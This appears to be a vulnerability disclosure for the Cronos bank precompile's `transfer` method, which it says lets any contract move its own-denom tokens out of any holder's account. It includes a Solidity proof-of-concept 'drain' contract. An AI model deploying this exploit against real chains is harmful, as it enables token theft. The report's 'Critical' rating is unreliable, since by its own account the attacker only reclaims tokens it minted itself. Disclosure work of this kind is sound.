### Title
Bank Precompile `transfer` Allows Arbitrary Sender — Unauthorized Token Drain from Any Holder (`x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` precompile's `transfer` method accepts a caller-supplied `sender` address and moves `evm/<callerContract>` denominated tokens from that address without any authorization check. Any EVM contract can drain `evm/<itsOwnAddress>` tokens from any holder by passing an arbitrary victim as the `sender` argument. This is a direct analog to the external report's auth-bypass class: user-controlled input selects which account's funds are moved, bypassing the requirement that only the token owner can authorize a transfer.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` branch of `BankContract.Run()` unpacks three arguments from the call input:

```go
sender    := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
``` [1](#0-0) 

It then derives the denom from the *calling contract's* address and executes a native bank transfer:

```go
denom := EVMDenom(contract.Caller())          // "evm/<callerAddress>"
amt   := sdk.NewCoin(denom, ...)
bc.bankKeeper.SendCoins(ctx, from, to, ...)   // from = sdk.AccAddress(sender.Bytes())
``` [2](#0-1) 

There is no check that `contract.Caller()` is authorized to move `sender`'s balance. The only guard present is `checkBlockedAddr(to)`, which only rejects module-account recipients: [3](#0-2) 

**Exploit path:**

1. Attacker deploys `AttackerContract` at address `0xATK`.
2. `AttackerContract` calls `bank.mint(victim, N)` → victim receives `N` tokens of denom `evm/0xATK` (e.g., as "reward tokens" in a fake DeFi protocol).
3. `AttackerContract` calls `bank.transfer(victim, attacker, N)` → the precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, N × evm/0xATK)` with no consent from victim.
4. Victim's entire `evm/0xATK` balance is drained.

The denom scoping (`evm/<callerAddress>`) does not constitute authorization: it only means the attacker can steal tokens *of their own denom*, which they can freely mint to any address first. The victim has no way to prevent the drain once they hold the tokens.

### Impact Explanation

**Critical.** The precompile performs an unauthorized transfer of precompile-controlled assets (`evm/<contract>` native tokens, the Cronos bank-precompile equivalent of ERC20 tokens). Any unprivileged EVM contract can drain the full balance of any holder of its own-denom tokens. This satisfies the allowed Critical impact: *"Unauthorized … transfer … for … precompile-controlled assets."*

### Likelihood Explanation

Reachable by any unprivileged EVM contract with a single call. No admin keys, governance, or validator access required. The attacker only needs to deploy a contract and have victims hold its tokens — a realistic scenario for any DeFi protocol built on the bank precompile.

### Recommendation

The `transfer` method must verify that the caller is authorized to move `sender`'s funds. The correct fix is to require `contract.Caller() == sender` (i.e., only the token holder itself, acting through its own contract context, may initiate a transfer), or to implement an ERC20-style allowance mechanism. The `mint` and `burn` methods correctly scope operations to the caller's own denom but do not restrict *whose* balance is affected in `transfer`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AttackerContract {
    IBank constant bank = IBank(address(0x64)); // precompile at 0x64

    // Step 1: mint tokens to victim (e.g., as "staking rewards")
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim without their consent
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // succeeds: bankKeeper.SendCoins(victim → attacker, evm/0xATK)
    }
}
```

Expected result: `drain()` succeeds and moves `evm/<AttackerContract>` tokens from `victim` to `attacker` with no authorization from `victim`. The `bankKeeper.SendCoins` call at line 192 of `bank.go` executes without any ownership check on `from`. [4](#0-3)
